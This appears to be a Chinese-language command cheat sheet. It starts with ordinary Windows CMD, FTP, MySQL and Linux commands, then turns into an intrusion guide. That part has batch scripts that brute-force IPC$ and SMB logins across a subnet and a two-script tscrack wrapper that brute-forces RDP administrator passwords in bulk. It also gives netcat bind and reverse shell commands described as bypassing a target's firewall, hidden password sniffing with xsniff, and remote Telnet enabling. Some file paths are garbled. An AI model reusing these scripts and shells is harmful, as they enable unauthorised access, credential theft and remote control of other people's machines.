<p>attrib 文件名 -A -R -S -H 或 +A +R +S +H 去掉(添加)某文件的 存档，只读，系统，隐藏 属性；用+则是添加为某属性</p>
<p>dir 查看文件，参数：&#x2F;Q 显示文件及目录属系统哪个用户，&#x2F;T:C 显示文件创建时间，&#x2F;T:A 显示文件上次被访问时间，&#x2F;T:W 上次被修改时间</p>
<p>date &#x2F;t 、 time &#x2F;t 使用此参数即“DATE&#x2F;T”、“TIME&#x2F;T”将只显示当前日期和时间，而不必输入新日期和时间</p>
<p>set 指定环境变量名称&#x3D;要指派给变量的字符 设置环境变量</p>
<p>set 显示当前所有的环境变量</p>
<p>set p(或其它字符) 显示出当前以字符 p(或其它字符)开头的所有环境变量</p>
<p>pause 暂停批处理程序，并显示出：请按任意键继续….</p>
<p>if 在批处理程序中执行条件处理（更多说明见 if 命令及变量）</p>
<p>goto 标签 将 cmd.exe 导向到批处理程序中带标签的行（标签必须单独一行，且以冒号打头，例如：“：start”标签）</p>
<p>call 路径批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见 call &#x2F;?）</p>
<p>for 对一组文件中的每一个文件执行某个特定命令（更多说明见 for 命令及变量）</p>
<p>echo on 或 off 打开或关闭 echo，仅用 echo 不加参数则显示当前 echo 设置</p>
<p>echo 信息 在屏幕上显示出信息</p>
<p>echo 信息 &gt;&gt; pass.txt 将”信息”保存到 pass.txt 文件中</p>
<p>findstr “Hello” aa.txt 在 aa.txt 文件中寻找字符串 hello</p>
<p>find 文件名 查找某文件</p>
<p>title 标题名字 更改 CMD 窗口标题名字</p>
<p>color 颜色值 设置 cmd 控制台前景和背景颜色；0&#x3D;黑、1&#x3D;蓝、2&#x3D;绿、3&#x3D;浅绿、4&#x3D;红、5&#x3D;紫、6&#x3D;黄、7&#x3D;白、8&#x3D;灰、9&#x3D;淡蓝、A&#x3D;淡绿、B&#x3D;淡浅绿、C&#x3D;淡红、D&#x3D;淡紫、E&#x3D;淡黄、F&#x3D;亮白</p>
<p>prompt 名称 更改 cmd.exe 的显示的命令提示符(把 C:、D:统一改为：EntSky )</p>
<p>ver 在 DOS 窗口下显示版本信息</p>
<p>winver 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机名）</p>
<p>format 盘符 &#x2F;FS:类型 格式化磁盘,类型:FAT、FAT32、NTFS ,例：Format D: &#x2F;FS:NTFS</p>
<p>md 　目录名 创建目录</p>
<p>replace 源文件　要替换文件的目录 替换文件</p>
<p>ren 原文件名　新文件名 重命名文件名</p>
<p>tree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称</p>
<p>type 文件名 显示文本文件的内容</p>
<p>more 文件名 逐屏显示输出文件</p>
<p>doskey 要锁定的命令&#x3D;字符</p>
<p>doskey 要解锁命令&#x3D; 为 DOS 提供的锁定命令(编辑命令行，重新调用 win2k 命令，并创建宏)。如：锁定 dir 命令：doskey dir&#x3D;entsky (不能用 doskey dir&#x3D;dir)；解锁：doskey dir&#x3D;</p>
<p>taskmgr 调出任务管理器</p>
<p>chkdsk &#x2F;F D: 检查磁盘 D 并显示状态报告；加参数&#x2F;f 并修复磁盘上的错误</p>
<p>tlntadmn telnt 服务 admn,键入 tlntadmn 选择 3，再选择 8,就可以更改 telnet 服务默认端口 23 为其它任何端口</p>
<p>exit 退出 cmd.exe 程序或目前，用参数&#x2F;B 则是退出当前批处理脚本而不是 cmd.exe</p>
<p>path 路径可执行文件的文件名 为可执行文件设置一个路径。</p>
<p>cmd 启动一个 win2K 命令解释窗口。参数：&#x2F;eff、&#x2F;en 关闭、开启命令扩展；更我详细说明见 cmd &#x2F;?</p>
<p>regedit &#x2F;s 注册表文件名 导入注册表；参数&#x2F;S 指安静模式导入，无任何提示；</p>
<p>regedit &#x2F;e 注册表文件名 导出注册表</p>
<p>cacls 文件名　参数 显示或修改文件访问控制列表（ACL）——针对 NTFS 格式时。参数：&#x2F;D 用户名:设定拒绝某用户访问；&#x2F;P 用户名:perm 替换指定用户的访问权限；&#x2F;G 用户名:perm 赋予指定用户访问权限；Perm 可以是: N 无，R 读取， W 写入， C 更改(写入)，F 完全控制；例：cacls D: est.txt &#x2F;D pub 设定 d: est.txt 拒绝 pub 用户访问。</p>
<p>cacls 文件名 查看文件的访问用户权限列表</p>
<p>REM 文本内容 在批处理文件中添加注解</p>
<p>netsh 查看或更改本地网络配置情况</p>
<p>IIS 服务命令</p>
<p>iisreset &#x2F;reboot 重启 win2k 计算机（但有提示系统将重启信息出现）</p>
<p>iisreset &#x2F;start 或 stop 启动（停止）所有 Internet 服务</p>
<p>iisreset &#x2F;restart 停止然后重新启动所有 Internet 服务</p>
<p>iisreset &#x2F;status 显示所有 Internet 服务状态</p>
<p>iisreset &#x2F;enable 或 disable 在本地系统上启用（禁用）Internet 服务的重新启动</p>
<p>iisreset &#x2F;rebootonerror 当启动、停止或重新启动 Internet 服务时，若发生错误将重新开机</p>
<p>iisreset &#x2F;noforce 若无法停止 Internet 服务，将不会强制终止 Internet 服务</p>
<p>iisreset &#x2F;timeout Val 在到达逾时间（秒）时，仍未停止 Internet 服务，若指定&#x2F;rebootonerror 参数，则电脑将会重新开机。预设值为重新启动 20 秒，停止 60 秒，重新开机 0 秒。</p>
<p>FTP 命令： (后面有详细说明内容)</p>
<p>ftp 的命令行格式为:</p>
<p>ftp －v －d －i －n －g[主机名] －v 显示远程服务器的所有响应信息。</p>
<p>－d 使用调试方式。</p>
<p>－n 限制 ftp 的自动登录,即不使用.netrc 文件。</p>
<p>－g 取消全局文件名。</p>
<p>help [命令] 或 ？[命令] 查看命令说明</p>
<p>bye 或 quit 终止主机 FTP 进程,并退出 FTP 管理方式.</p>
<p>pwd 列出当前远端主机目录</p>
<p>put 或 send 本地文件名 [上传到主机上的文件名] 将本地一个文件传送至远端主机中</p>
<p>get 或 recv [远程主机文件名] [下载到本地后的文件名] 从远端主机中传送至本地主机中</p>
<p>mget [remote-files] 从远端主机接收一批文件至本地主机</p>
<p>mput local-files 将本地主机中一批文件传送至远端主机</p>
<p>dir 或 ls [remote-directory] [local-file] 列出当前远端主机目录中的文件.如果有本地文件,就将结果写至本地文件</p>
<p>ascii 设定以 ASCII 方式传送文件(缺省值)</p>
<p>bin 或 image 设定以二进制方式传送文件</p>
<p>bell 每完成一次文件传送,报警提示</p>
<p>cdup 返回上一级目录</p>
<p>close 中断与远程服务器的 ftp 会话(与 open 对应)</p>
<p>open host[port] 建立指定 ftp 服务器连接,可指定连接端口</p>
<p>delete 删除远端主机中的文件</p>
<p>mdelete [remote-files] 删除一批文件</p>
<p>mkdir directory-name 在远端主机中建立目录</p>
<p>rename [from] [to] 改变远端主机中的文件名</p>
<p>rmdir directory-name 删除远端主机中的目录</p>
<p>status 显示当前 FTP 的状态</p>
<p>system 显示远端主机系统类型</p>
<p>user user-name [password] [account] 重新以别的用户名登录远端主机</p>
<p>open host [port] 重新建立一个新的连接</p>
<p>prompt 交互提示模式</p>
<p>macdef 定义宏命令</p>
<p>lcd 改变当前本地主机的工作目录,如果缺省,就转到当前用户的 HOME 目录</p>
<p>chmod 改变远端主机的文件权限</p>
<p>case 当为 ON 时,用 MGET 命令拷贝的文件名到本地机器中,全部转换为小写字母</p>
<p>cd remote－dir 进入远程主机目录</p>
<p>cdup 进入远程主机目录的父目录</p>
<p>! 在本地机中执行交互 shell，exit 回到 ftp 环境,如!ls*.zip</p>
<p>#5</p>
<p>MYSQL 命令</p>
<p>mysql -h 主机地址 -u 用户名 －p 密码 连接 MYSQL;如果刚安装好 MYSQL，超级用户 root 是没有密码的。</p>
<p>（例：mysql -h110.110.110.110 -Uroot -P123456</p>
<p>注:u 与 root 可以不用加空格，其它也一样）</p>
<p>exit 退出 MYSQL</p>
<p>mysqladmin -u 用户名 -p 旧密码 password 新密码 修改密码</p>
<p>grant select on 数据库.* to 用户名@登录主机 identified by “密码”; 增加新用户。（注意：和上面不同，下面的因为是 MYSQL 环境中的命令，所以后面都带一个分号作为命令结束符）</p>
<p>show databases; 显示数据库列表。刚开始时才两个数据库：mysql 和 test。mysql 库很重要它里面有 MYSQL 的系统信息，我们改密码和新增用户，实际上就是用这个库进行操作。</p>
<p>use mysql；</p>
<p>show tables; 显示库中的数据表</p>
<p>describe 表名; 显示数据表的结构</p>
<p>create database 库名; 建库</p>
<p>use 库名；</p>
<p>create table 表名 (字段设定列表)； 建表</p>
<p>drop database 库名;</p>
<p>drop table 表名； 删库和删表</p>
<p>delete from 表名; 将表中记录清空</p>
<p>select * from 表名; 显示表中的记录</p>
<p>mysqldump –opt school&gt;school.bbb 备份数据库：（命令在 DOS 的 mysqlin 目录下执行）;注释:将数据库 school 备份到 school.bbb 文件，school.bbb 是一个文本文件，文件名任取，打开看看你会有新发现。</p>
<p>win2003 系统下新增命令（实用部份）：</p>
<p>shutdown &#x2F;参数 关闭或重启本地或远程主机。</p>
<p>参数说明：&#x2F;S 关闭主机，&#x2F;R 重启主机， &#x2F;T 数字 设定延时的时间，范围 0 ～ 180 秒之间， &#x2F;A 取消开机，&#x2F;M &#x2F;&#x2F;IP 指定的远程主机。</p>
<p>例：shutdown &#x2F;r &#x2F;t 0 立即重启本地主机（无延时）</p>
<p>taskill &#x2F;参数 进程名或进程的 pid 终止一个或多个任务和进程。</p>
<p>参数说明：&#x2F;PID 要终止进程的 pid,可用 tasklist 命令获得各进程的 pid，&#x2F;IM 要终止的进程的进程名，&#x2F;F 强制终止进程，&#x2F;T 终止指定的进程及他所启动的子进程。</p>
<p>tasklist 显示当前运行在本地和远程主机上的进程、服务、服务各进程的进程标识符(PID)。</p>
<p>参数说明：&#x2F;M 列出当前进程加载的 dll 文件，&#x2F;SVC 显示出每个进程对应的服务，无参数时就只列出当前的进程。</p>
<p>Linux 系统下基本命令　注：要区分大小写</p>
<p>uname 显示版本信息（同 win2K 的 ver）</p>
<p>dir 显示当前目录文件,ls -al 显示包括隐藏文件（同 win2K 的 dir）</p>
<p>pwd 查询当前所在的目录位置</p>
<p>cd cd 　..回到上一层目录，注意 cd 与..之间有空格。cd 　&#x2F;返回到根目录。</p>
<p>cat 文件名 查看文件内容</p>
<p>cat &gt;abc.txt 往 abc.txt 文件中写上内容。</p>
<p>more 文件名 以一页一页的方式显示一个文本文件。</p>
<p>cp 复制文件</p>
<p>mv 移动文件</p>
<p>rm 文件名 删除文件，rm -a 目录名删除目录及子目录</p>
<p>mkdir 目录名 建立目录</p>
<p>rmdir 删除子目录，目录内没有文档。</p>
<p>chmod 设定档案或目录的存取权限</p>
<p>grep 在档案中查找字符串</p>
<p>diff 档案文件比较</p>
<p>find 档案搜寻</p>
<p>date 现在的日期、时间</p>
<p>who 查询目前和你使用同一台机器的人以及 Login 时间地点</p>
<p>w 查询目前上机者的详细资料</p>
<p>whoami 查看自己的帐号名称</p>
<p>groups 查看某人的 Group</p>
<p>passwd 更改密码</p>
<p>history 查看自己下过的命令</p>
<p>ps 显示进程状态</p>
<p>kill 停止某进程</p>
<p>gcc 黑客通常用它来编译 C 语言写的文件</p>
<p>su 权限转换为指定使用者</p>
<p>telnet IP telnet 连接对方主机（同 win2K），当出现 bash$时就说明连接成功。</p>
<p>ftp ftp 连接上某服务器（同 win2K）</p>
<p>批处理命令与变量</p>
<p>1：for 命令及变量 基本格式</p>
<p>FOR &#x2F;参数 %variable IN (set) DO command [command_parameters] %variable:指定一个单一字母可替换的参数，如：%i ，而指定一个变量则用：%%i ，而调用变量时用：%i% ，变量是区分大小写的（%i 不等于 %I）。</p>
<p>批处理每次能处理的变量从%0—%9 共 10 个，其中%0 默认给批处理文件名使用，%1 默认为使用此批处理时输入的的第一个值，同理：%2—%9 指输入的第 2-9 个值；例：net use ipipc$ pass &#x2F;user:user 中 ip 为%1,pass 为%2 ,user 为%3</p>
<p>(set):指定一个或一组文件，可使用通配符，如：(D:user.txt)和(1 1 254)(1 -1 254),{ “(1 1 254)”第一个”1”指起始值，第二个”1”指增长量，第三个”254”指结束值，即：从 1 到 254；“(1 -1 254)”说明：即从 254 到 1 }</p>
<p>command：指定对第个文件执行的命令，如：net use 命令；如要执行多个命令时，命令这间加：&amp; 来隔开</p>
<p>command_parameters：为特定命令指定参数或命令行开关</p>
<p>IN (set)：指在(set)中取值；DO command ：指执行 command</p>
<p>参数：&#x2F;L 指用增量形式{ (set)为增量形式时 }；&#x2F;F 指从文件中不断取值，直到取完为止{ (set)为文件时，如(d:pass.txt)时 }。</p>
<p>用法举例：</p>
<p><a href="/echo">@echo </a> off</p>
<p>echo 用法格式：test.bat <em>.</em>.* &gt; test.txt</p>
<p>for &#x2F;L %%G in (1 1 254) do echo %1.%%G &gt;&gt;test.txt &amp; net use %1.%%G &#x2F;user:administrator | find “命令成功完成” &gt;&gt;test.txt</p>
<p>存为 test.bat 说明：对指定的一个 C 类网段的 254 个 IP 依次试建立 administrator 密码为空的 IPC$连接，如果成功就把该 IP 存在 test.txt 中。</p>
<p>&#x2F;L 指用增量形式（即从 1-254 或 254-1）；输入的 IP 前面三位：_._.*为批处理默认的 %1；%%G 为变量(ip 的最后一位）；&amp; 用来隔开 echo 和 net use 这二个命令；| 指建立了 ipc$后，在结果中用 find 查看是否有”命令成功完成”信息；%1.%%G 为完整的 IP 地址；(1 1 254) 指起始值，增长量，结止值。</p>
<p><a href="/echo">@echo </a> off</p>
<p>echo 用法格式：ok.bat ip</p>
<p>FOR &#x2F;F %%i IN (D:user.dic) DO smb.exe %1 %%i D:pass.dic 200</p>
<p>存为：ok.exe 说明：输入一个 IP 后，用字典文件 d:pass.dic 来暴解 d:user.dic 中的用户密码，直到文件中值取完为止。%%i 为用户名；%1 为输入的 IP 地址（默认）。</p>
<p>七：</p>
<p>2：if 命令及变量 基本格式</p>
<p>IF [not] errorlevel 数字 命令语句 如果程序运行最后返回一个等于或大于指定数字的退出编码，指定条件为“真”。</p>
<p>例：IF errorlevel 0 命令 指程序执行后返回的值为 0 时，就值行后面的命令；IF not errorlevel 1 命令指程序执行最后返回的值不等于 1，就执行后面的命令。</p>
<p>0 指发现并成功执行（真）；1 指没有发现、没执行（假）。</p>
<p>IF [not] 字符串 1&#x3D;&#x3D;字符串 2 命令语句 如果指定的文本字符串匹配（即：字符串 1 等于 字符串 2），就执行后面的命令。</p>
<p>例：“if “%2%”&#x3D;&#x3D;”4” goto start”指：如果输入的第二个变量为 4 时，执行后面的命令（注意：调用变量时就%变量名%并加” “）</p>
<p>IF [not] exist 文件名 命令语句 如果指定的文件名存在，就执行后面的命令。</p>
<p>例：“if not nc.exe goto end”指：如果没有发现 nc.exe 文件就跳到”:end”标签处。</p>
<p>IF [not] errorlevel 数字 命令语句 else 命令语句或 IF [not] 字符串 1&#x3D;&#x3D;字符串 2 命令语句 else 命令语句或 IF [not] exist 文件名 命令语句 else 命令语句 加上：else 命令语句后指：当前面的条件不成立时，就指行 else 后面的命令。注意：else 必须与 if 在同一行才有效。 当有 del 命令时需把 del 命令全部内容用&lt; &gt;括起来，因为 del 命令要单独一行时才能执行，用上&lt; &gt;后就等于是单独一行了；例如：“if exist test.txt. ~~ else echo test.txt.missing ”，注意命令中的“.”~~</p>
<p>系统外部命令</p>
<p>注：系统外部命令(均需下载相关工具)</p>
<p>瑞士军刀：nc.exe</p>
<p>参数说明：</p>
<p>-h 查看帮助信息</p>
<p>-d 后台模式</p>
<p>-e prog 程序重定向，一但连接就执行[危险]</p>
<p>-i secs 延时的间隔</p>
<p>-l 监听模式，用于入站连接</p>
<p>-L 监听模式，连接天闭后仍然继续监听，直到 CTR+C</p>
<p>-n IP 地址，不能用域名</p>
<p>-o film 记录 16 进制的传输</p>
<p>-p[空格]端口 本地端口号</p>
<p>-r 随机本地及远程端口</p>
<p>-t 使用 Telnet 交互方式</p>
<p>-u UDP 模式</p>
<p>-v 详细输出，用-vv 将更详细</p>
<p>-w 数字 timeout 延时间隔</p>
<p>-z 将输入，输出关掉（用于扫锚时）</p>
<p>基本用法：</p>
<p>nc -nvv 192.168.0.1 80 连接到 192.168.0.1 主机的 80 端口</p>
<p>nc -l -p 80 开启本机的 TCP 80 端口并监听</p>
<p>nc -nvv -w2 -z 192.168.0.1 80-1024 扫锚 192.168.0.1 的 80-1024 端口</p>
<p>nc -l -p 5354 -t -e c:winntsystem32cmd.exe 绑定 remote 主机的 cmdshell 在 remote 的 TCP 5354 端口</p>
<p>nc -t -e c:winntsystem32cmd.exe 192.168.0.2 5354 梆定 remote 主机的 cmdshell 并反向连接 192.168.0.2 的 5354 端口</p>
<p>高级用法：</p>
<p>nc -L -p 80 作为蜜罐用 1：开启并不停地监听 80 端口，直到 CTR+C 为止</p>
<p>nc -L -p 80 &gt; c:log.txt 作为蜜罐用 2：开启并不停地监听 80 端口，直到 CTR+C,同时把结果输出到 c:log.txt</p>
<p>nc -L -p 80 &lt; c:honeyport.txt 作为蜜罐用 3-1：开启并不停地监听 80 端口，直到 CTR+C,并把 c:honeyport.txt 中内容送入管道中，亦可起到传送文件作用</p>
<p>type.exe c:honeyport | nc -L -p 80 作为蜜罐用 3-2：开启并不停地监听 80 端口，直到 CTR+C,并把 c:honeyport.txt 中内容送入管道中,亦可起到传送文件作用</p>
<p>本机上用：nc -l -p 本机端口</p>
<p>在对方主机上用：nc -e cmd.exe 本机 IP -p 本机端口 *win2K</p>
<p>nc -e &#x2F;bin&#x2F;sh 本机 IP -p 本机端口 *linux,unix 反向连接突破对方主机的防火墙</p>
<p>本机上用：nc -d -l -p 本机端口 &lt; 要传送的文件路径及名称</p>
<p>在对方主机上用：nc -vv 本机 IP 本机端口 &gt; 存放文件的路径及名称 传送文件到对方主机</p>
<p>备 注：</p>
<p>| 管道命令</p>
<p>&lt; 或 &gt; 重定向命令。“&lt;”，例如：tlntadmn &lt; test.txt 指把 test.txt 的内容赋值给 tlntadmn 命令</p>
<p>@ 表示执行@后面的命令，但不会显示出来（后台执行）；例：<a href="/dir">@dir </a> c:winnt &gt;&gt; d:log.txt 意思是：后台执行 dir，并把结果存在 d:log.txt 中</p>
<blockquote>
<p>与&gt;&gt;的区别 “&gt;”指：覆盖；”&gt;&gt;”指：保存到(添加到）。</p>
</blockquote>
<p>如：<a href="/dir">@dir </a> c:winnt &gt;&gt; d:log.txt 和<a href="/dir">@dir </a> c:winnt &gt; d:log.txt 二个命令分别执行二次比较看：用&gt;&gt;的则是把二次的结果都保存了，而用：&gt;则只有一次的结果，是因为第二次的结果把第一次的覆盖了。</p>
<p>八：</p>
<p>扫描工具：xscan.exe</p>
<p>基本格式</p>
<p>xscan -host &lt;起始 IP&gt;[-&lt;终止 IP&gt;] &lt;检测项目&gt; [其他选项] 扫锚”起始 IP 到终止 IP”段的所有主机信息</p>
<p>xscan -file &lt;主机列表文件名&gt; &lt;检测项目&gt; [其他选项] 扫锚”主机 IP 列表文件名”中的所有主机信息</p>
<p>检测项目</p>
<p>-active 检测主机是否存活</p>
<p>-os 检测远程操作系统类型（通过 NETBIOS 和 SNMP 协议）</p>
<p>-port 检测常用服务的端口状态</p>
<p>-ftp 检测 FTP 弱口令</p>
<p>-pub 检测 FTP 服务匿名用户写权限</p>
<p>-pop3 检测 POP3-Server 弱口令</p>
<p>-smtp 检测 SMTP-Server 漏洞</p>
<p>-sql 检测 SQL-Server 弱口令</p>
<p>-smb 检测 NT-Server 弱口令</p>
<p>-iis 检测 IIS 编码&#x2F;解码漏洞</p>
<p>-cgi 检测 CGI 漏洞</p>
<p>-nasl 加载 Nessus 攻击脚本</p>
<p>-all 检测以上所有项目</p>
<p>其它选项</p>
<p>-i 适配器编号 设置网络适配器, &lt;适配器编号&gt;可通过”-l”参数获取</p>
<p>-l 显示所有网络适配器</p>
<p>-v 显示详细扫描进度</p>
<p>-p 跳过没有响应的主机</p>
<p>-o 跳过没有检测到开放端口的主机</p>
<p>-t 并发线程数量,并发主机数量 指定最大并发线程数量和并发主机数量, 默认数量为 100,10</p>
<p>-log 文件名 指定扫描报告文件名 (后缀为：TXT 或 HTML 格式的文件)</p>
<p>用法示例</p>
<p>xscan -host 192.168.1.1-192.168.255.255 -all -active -p 　检测 192.168.1.1-192.168.255.255 网段内主机的所有漏洞，跳过无响应的主机</p>
<p>xscan -host 192.168.1.1-192.168.255.255 -port -smb -t 150 -o 检测 192.168.1.1-192.168.255.255 网段内主机的标准端口状态，NT 弱口令用户，最大并发线程数量为 150，跳过没有检测到开放端口的主机</p>
<p>xscan -file hostlist.txt -port -cgi -t 200,5 -v -o 检测“hostlist.txt”文件中列出的所有主机的标准端口状态，CGI 漏洞，最大并发线程数量为 200，同一时刻最多检测 5 台主机，显示详细检测进度，跳过没有检测到开放端口的主机</p>
<p>九：</p>
<p>命令行方式嗅探器: xsniff.exe</p>
<p>可捕获局域网内 FTP&#x2F;SMTP&#x2F;POP3&#x2F;HTTP 协议密码</p>
<p>参数说明</p>
<p>-tcp 输出 TCP 数据报</p>
<p>-udp 输出 UDP 数据报</p>
<p>-icmp 输出 ICMP 数据报</p>
<p>-pass 过滤密码信息</p>
<p>-hide 后台运行</p>
<p>-host 解析主机名</p>
<p>-addr IP 地址 过滤 IP 地址</p>
<p>-port 端口 过滤端口</p>
<p>-log 文件名 将输出保存到文件</p>
<p>-asc 以 ASCII 形式输出</p>
<p>-hex 以 16 进制形式输出</p>
<p>用法示例</p>
<p>xsniff.exe -pass -hide -log pass.log 后台运行嗅探密码并将密码信息保存在 pass.log 文件中</p>
<p>xsniff.exe -tcp -udp -asc -addr 192.168.1.1 嗅探 192.168.1.1 并过滤 tcp 和 udp 信息并以 ASCII 格式输出</p>
<p>终端服务密码破解: tscrack.exe</p>
<p>参数说明</p>
<p>-h 显示使用帮助</p>
<p>-v 显示版本信息</p>
<p>-s 在屏幕上打出解密能力</p>
<p>-b 密码错误时发出的声音</p>
<p>-t 同是发出多个连接（多线程）</p>
<p>-N Prevent System Log entries on targeted server</p>
<p>-U 卸载移除 tscrack 组件</p>
<p>-f 使用－f 后面的密码</p>
<p>-F 间隔时间（频率）</p>
<p>-l 使用－l 后面的用户名</p>
<p>-w 使用－w 后面的密码字典</p>
<p>-p 使用－p 后面的密码</p>
<p>-D 登录主页面</p>
<p>用法示例</p>
<p>tscrack 192.168.0.1 -l administrator -w pass.dic 远程用密码字典文件暴破主机的 administrator 的登陆密码</p>
<p>tscrack 192.168.0.1 -l administrator -p 123456 用密码 123456 远程登陆 192.168.0.1 的 administrator 用户</p>
<p>@if not exist ipcscan.txt goto noscan</p>
<p><a href="/for">@for </a> &#x2F;f “tokens&#x3D;1 delims&#x3D; “ %%i in (3389.txt) do call hack.bat %%i</p>
<p>nscan</p>
<p><a href="/echo">@echo </a> 3389.txt no find or scan faild</p>
<p>(① 存为 3389.bat) （假设现有用 SuperScan 或其它扫锚器扫到一批开有 3389 的主机 IP 列表文件 3389.txt)</p>
<p>3389.bat 意思是：从 3389.txt 文件中取一个 IP，接着运行 hack.bat</p>
<p>@if not exist tscrack.exe goto noscan</p>
<p><a href="/tscrack">@tscrack </a> %1 -l administrator -w pass.dic &gt;&gt;rouji.txt</p>
<p>:noscan</p>
<p><a href="/echo">@echo </a> tscrack.exe no find or scan faild</p>
<p>(② 存为 hack.bat) (运行 3389.bat 就 OK，且 3389.bat、hack.bat、3389.txt、pass.dic 与 tscrack.exe 在同一个目录下；就可以等待结果了)</p>
<p>hack.bat 意思是：运行 tscrack.exe 用字典暴破 3389.txt 中所有主机的 administrator 密码，并将破解结果保存在 rouji.txt 文件中。</p>
<p>其它</p>
<p>Shutdown.exe</p>
<p>Shutdown IP 地址 t:20 20 秒后将对方 NT 自动关闭（Windows 2003 系统自带工具，在 Windows2000 下用进就得下载此工具才能用。在前面 Windows 2003 DOS 命令中有详细介绍。）</p>
<p>fpipe.exe (TCP 端口重定向工具) 在第二篇中有详细说明（端口重定向绕过防火墙）</p>
<p>fpipe -l 80 -s 1029 -r 80 当有人扫锚你的 80 端口时，他扫到的结果会完全是的主机信息</p>
<p>Fpipe -l 23 -s 88 -r 23 目标 IP 把本机向目标 IP 发送的 23 端口 Telnet 请求经端口重定向后，就通过 88 端口发送到目标 IP 的 23 端口。（与目标 IP 建立 Telnet 时本机就用的 88 端口与其相连接）然后：直接 Telnet 127.0.0.1（本机 IP）就连接到目标 IP 的 23 端口了。</p>
<p>OpenTelnet.exe (远程开启 telnet 工具)</p>
<p>opentelnet.exe IP 帐号　密码　 ntlm 认证方式　 Telnet 端口 （不需要上传 ntlm.exe 破坏微软的身份验证方式）直接远程开启对方的 telnet 服务后，就可用 telnet ip 连接上对方。</p>
<p>NTLM 认证方式：0：不使用 NTLM 身份验证；1：先尝试 NTLM 身份验证，如果失败，再使用用户名和密码；2：只使用 NTLM 身份验证。</p>
<p>ResumeTelnet.exe (OpenTelnet 附带的另一个工具)</p>
<p>resumetelnet.exe IP 　帐号　密码 用 Telnet 连接完对方后，就用这个命令将对方的 Telnet 设置还原，并同时关闭 Telnet 服务。</p>
<p>FTP 命令详解</p>
<p>FTP 命令是 Internet 用户使用最频繁的命令之一，熟悉并灵活应用 FTP 的内部命令，可以大大方便使用者，并收到事半功倍之效。如果你想学习使用进行后台 FTP 下载，那么就必须学习 FTP 指令。</p>
<p>FTP 的命令行格式为：</p>
<p>ftp -v -d -i -n -g [主机名] ，其中</p>
<p>-v 显示远程服务器的所有响应信息</p>
<p>-n 限制 ftp 的自动登录，即不使用；.n etrc 文件；</p>
<p>-d 使用调试方式；</p>
<p>-g 取消全局文件名。</p>
<p>FTP 使用的内部命令如下(中括号表示可选项):</p>
<p>1.![cmd[args]]：在本地机中执行交互 shell，exit 回到 ftp 环境，如：!ls*.zip</p>
<p>2.$ macro-ame[args]： 执行宏定义 macro-name。</p>
<p>3.account[password]： 提供登录远程系统成功后访问系统资源所需的补充口令。</p>
<p>4.append local-file[remote-file]：将本地文件追加到远程系统主机，若未指定远程系统文件名，则使用本地文件名。</p>
<p>5.ascii：使用 ascii 类型传输方式。</p>
<p>6.bell：每个命令执行完毕后计算机响铃一次。</p>
<p>7.bin：使用二进制文件传输方式。</p>
<p>8.bye：退出 ftp 会话过程。</p>
<p>9.case：在使用 mget 时，将远程主机文件名中的大写转为小写字母。</p>
<ol start="10">
<li>cd remote-dir：进入远程主机目录。</li>
</ol>
<p>11.cdup：进入远程主机目录的父目录。</p>
<p>12.chmod mode file-name：将远程主机文件 file-name 的存取方式设置为 mode，如：chmod 777 a.out。</p>
<p>13.close：中断与远程服务器的 ftp 会话(与 open 对应)。</p>
<p>14 .cr：使用 asscii 方式传输文件时，将回车换行转换为回行。</p>
<p>15.delete remote-file：删除远程主机文件。</p>
<p>16.debug[debug-value]：设置调试方式， 显示发送至远程主机的每条命令，如：deb up 3，若设为 0，表示取消 debug。</p>
<p>17.dir[remote-dir][local-file]：显示远程主机目录，并将结果存入本地文件。</p>
<p>18.disconnection：同 close。</p>
<p>19.form format：将文件传输方式设置为 format，缺省为 file 方式。</p>
<p>20.get remote-file[local-file]： 将远程主机的文件 remote-file 传至本地硬盘的 local-file。</p>
<p>21.glob：设置 mdelete，mget，mput 的文件名扩展，缺省时不扩展文件名，同命令行的-g 参数。</p>
<p>22.hash：每传输 1024 字节，显示一个 hash 符号(#)。</p>
<p>23.help[cmd]：显示 ftp 内部命令 cmd 的帮助信息，如：help get。</p>
<p>24.idle[seconds]：将远程服务器的休眠计时器设为[seconds]秒。</p>
<p>25.image：设置二进制传输方式(同 binary)。</p>
<p>26.lcd[dir]：将本地工作目录切换至 dir。</p>
<ol start="27">
<li>ls[remote-dir][local-file]：显示远程目录 remote-dir， 并存入本地文件 local-file。</li>
</ol>
<p>28.macdef macro-name：定义一个宏，遇到 macdef 下的空行时，宏定义结束。</p>
<p>29.mdelete[remote-file]：删除远程主机文件。</p>
<p>30.mdir remote-files local-file：与 dir 类似，但可指定多个远程文件，如 ：mdir <em>.o.</em>.zipoutfile 。</p>
<p>31.mget remote-files：传输多个远程文件。</p>
<p>32.mkdir dir-name：在远程主机中建一目录。</p>
<p>33.mls remote-file local-file：同 nlist，但可指定多个文件名。</p>
<p>34.mode[modename]：将文件传输方式设置为 modename， 缺省为 stream 方式。</p>
<p>35.modtime file-name：显示远程主机文件的最后修改时间。</p>
<p>36.mput local-file：将多个文件传输至远程主机。</p>
<p>37.newer file-name： 如果远程机中 file-name 的修改时间比本地硬盘同名文件的时间更近，则重传该文件。</p>
<p>38.nlist[remote-dir][local-file]：显示远程主机目录的文件清单，并存入本地硬盘的 local-file。</p>
<p>39.nmap[inpattern outpattern]：设置文件名映射机制， 使得文件传输时，文件中的某些字符相互转换， 如：nmap $1.$2.$3[$1，$2].[$2，$3]，则传输文件 a1.a2.a3 时，文件名变为 a1，a2。 该命令特别适用于远程主机为非 UNIX 机的情况。</p>
<p>40.ntrans[inchars[outchars]]：设置文件名字符的翻译机制，如 ntrans1R，则文件名 LLL 将变为 RRR。</p>
<p>41.open host[port]：建立指定 ftp 服务器连接，可指定连接端口。</p>
<p>42.passive：进入被动传输方式。</p>
<p>43.prompt：设置多个文件传输时的交互提示。</p>
<p>44.proxy ftp-cmd：在次要控制连接中，执行一条 ftp 命令， 该命令允许连接两个 ftp 服务器，以在两个服务器间传输文件。第一条 ftp 命令必须为 open，以首先建立两个服务器间的连接。</p>
<p>45.put local-file[remote-file]：将本地文件 local-file 传送至远程主机。</p>
<p>46.pwd：显示远程主机的当前工作目录。</p>
<p>47.quit：同 bye，退出 ftp 会话。</p>
<p>48.quote arg1，arg2…：将参数逐字发至远程 ftp 服务器，如：quote syst.</p>
<p>49.recv remote-file[local-file]：同 get。</p>
<p>50.reget remote-file[local-file]：类似于 get， 但若 local-file 存在，则从上次传输中断处续传。</p>
<p>51.rhelp[cmd-name]：请求获得远程主机的帮助。</p>
